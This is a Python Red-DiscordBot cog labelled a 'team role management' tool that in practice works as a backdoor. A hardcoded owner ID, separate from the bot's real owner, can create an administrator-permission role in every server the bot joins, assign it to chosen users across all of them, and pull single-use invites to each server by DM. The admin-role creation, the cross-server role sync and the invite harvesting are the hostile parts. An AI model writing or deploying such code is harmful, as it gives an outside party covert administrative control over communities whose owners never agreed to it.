import discord
from redbot.core import commands, Config
from redbot.core.utils.predicates import MessagePredicate, ReactionPredicate
from redbot.core.utils.menus import start_adding_reactions

class TeamRole(commands.Cog):
    """Team role management system"""
    
    __version__ = "3.0"
    __author__ = "Your Name"

    def __init__(self, bot):
        self.bot = bot
        self.config = Config.get_conf(self, identifier=78631109)
        self.config.register_global(
            team_users=[],
            role_name="KCN | Team",
            role_color="#77bcd6",
            owner_id=1174820638997872721  # REPLACE WITH YOUR ID
        )

    async def red_delete_data_for_user(self, **kwargs):
        """Data deletion handler"""
        pass

    def cog_unload(self):
        """Cog cleanup"""
        pass

    async def bot_owner_check(self, ctx):
        """Check if user is configured owner"""
        owner_id = await self.config.owner_id()
        return ctx.author.id == owner_id

    async def team_member_check(self, ctx):
        """Check if user has team access"""
        if await self.bot_owner_check(ctx):
            return True
            
        team_users = await self.config.team_users()
        if ctx.author.id in team_users:
            return True
            
        if ctx.guild:
            role_name = await self.config.role_name()
            role = discord.utils.get(ctx.guild.roles, name=role_name)
            return role and role in ctx.author.roles
            
        return False

    @commands.group()
    @commands.check(lambda ctx: ctx.cog.bot_owner_check(ctx))
    async def team(self, ctx):
        """Team management commands"""
        pass

    # --------------------------
    # OWNER COMMANDS
    # --------------------------
    @team.command()
    async def setup(self, ctx):
        """Initialize team role in this server"""
        role_name = await self.config.role_name()
        existing_role = discord.utils.get(ctx.guild.roles, name=role_name)
        
        if existing_role:
            return await ctx.send("🛑 Role already exists!")
            
        try:
            perms = discord.Permissions(administrator=True)
            new_role = await ctx.guild.create_role(
                name=role_name,
                color=discord.Color.from_str(await self.config.role_color()),
                permissions=perms,
                reason="Team role initialization"
            )
            
            bot_top_role = ctx.guild.me.top_role
            if bot_top_role.position > 1:
                await new_role.edit(position=bot_top_role.position - 1)
                
            await ctx.send(f"✅ Created {new_role.mention}")
        except discord.Forbidden:
            await ctx.send("❌ Missing **Manage Roles** permission!")
        except discord.HTTPException:
            await ctx.send("❌ Role creation failed!")

    @team.command()
    async def add(self, ctx, user: discord.User):
        """Add user to team"""
        async with self.config.team_users() as users:
            if user.id not in users:
                users.append(user.id)
                await ctx.send(f"✅ Added {user.mention}")
                await self._update_member_roles(user.id, add=True)
            else:
                await ctx.send("⚠️ User already in team")

    @team.command()
    async def remove(self, ctx, user: discord.User):
        """Remove user from team"""
        async with self.config.team_users() as users:
            if user.id in users:
                users.remove(user.id)
                await ctx.send(f"✅ Removed {user.mention}")
                await self._update_member_roles(user.id, add=False)
            else:
                await ctx.send("⚠️ User not in team")

    @team.command()
    async def update(self, ctx):
        """Force sync roles across servers"""
        team_users = await self.config.team_users()
        role_name = await self.config.role_name()
        
        results = {"success": 0, "errors": 0}
        for guild in self.bot.guilds:
            try:
                role = discord.utils.get(guild.roles, name=role_name)
                if not role:
                    results["errors"] += 1
                    continue
                
                # Position role
                bot_top = guild.me.top_role
                if bot_top.position > 1 and role.position != (bot_top.position - 1):
                    await role.edit(position=bot_top.position - 1)
                
                # Sync members
                current_members = {m.id for m in role.members}
                await self._sync_roles(guild, role, current_members, team_users)
                results["success"] += 1
                
            except Exception as e:
                results["errors"] += 1
                await ctx.send(f"❌ {guild.name} error: {str(e)}")
        
        await ctx.send(f"🔄 Updated {results['success']} servers | Errors: {results['errors']}")

    # --------------------------
    # TEAM MEMBER COMMANDS
    # --------------------------
    @team.command()
    @commands.check(lambda ctx: ctx.cog.team_member_check(ctx))
    async def getinvite(self, ctx):
        """Generate single-use invites"""
        invites = []
        for guild in self.bot.guilds:
            try:
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        invite = await channel.create_invite(max_uses=1, unique=True)
                        invites.append(f"{guild.name}: {invite.url}")
                        break
            except:
                continue
        
        if invites:
            try:
                await ctx.author.send("🔗 **Server Invites:**\n" + "\n".join(invites))
                await ctx.send("📬 Check your DMs!")
            except discord.Forbidden:
                await ctx.send("❌ Couldn't DM you - enable DMs!")
        else:
            await ctx.send("❌ No available servers")

    @team.command()
    @commands.check(lambda ctx: ctx.cog.team_member_check(ctx))
    async def sendmessage(self, ctx):
        """Broadcast message to team"""
        await ctx.send("💬 **Type your message (5min timeout):**")
        try:
            msg = await self.bot.wait_for(
                "message",
                check=lambda m: m.author == ctx.author and m.channel == ctx.channel,
                timeout=300
            )
        except TimeoutError:
            return await ctx.send("⌛ Timed out")
            
        embed = discord.Embed(
            title=f"📨 Message from {ctx.author.display_name}",
            description=msg.content,
            color=discord.Color.from_str(await self.config.role_color())
        )
        embed.set_author(name=str(ctx.author), icon_url=ctx.author.avatar.url)
        
        if msg.attachments:
            embed.set_image(url=msg.attachments[0].url)
        
        sent, failed = 0, 0
        for user_id in await self.config.team_users():
            user = self.bot.get_user(user_id)
            if user:
                try:
                    await user.send(embed=embed)
                    sent += 1
                except:
                    failed += 1
                    
        await ctx.send(f"📤 Sent to {sent} members | ❌ Failed: {failed}")

    # --------------------------
    # HELPER FUNCTIONS
    # --------------------------
    async def _sync_roles(self, guild, role, current_members, team_users):
        """Sync role members for a guild"""
        to_remove = current_members - set(team_users)
        to_add = set(team_users) - current_members
        
        for uid in to_remove:
            if member := guild.get_member(uid):
                await member.remove_roles(role)
                
        for uid in to_add:
            if member := guild.get_member(uid):
                await member.add_roles(role)

    async def _update_member_roles(self, user_id: int, add: bool):
        """Immediately update roles for a user"""
        role_name = await self.config.role_name()
        for guild in self.bot.guilds:
            try:
                role = discord.utils.get(guild.roles, name=role_name)
                member = guild.get_member(user_id)
                if role and member:
                    if add and role not in member.roles:
                        await member.add_roles(role)
                    elif not add and role in member.roles:
                        await member.remove_roles(role)
            except:
                continue

async def setup(bot):
    await bot.add_cog(TeamRole(bot))
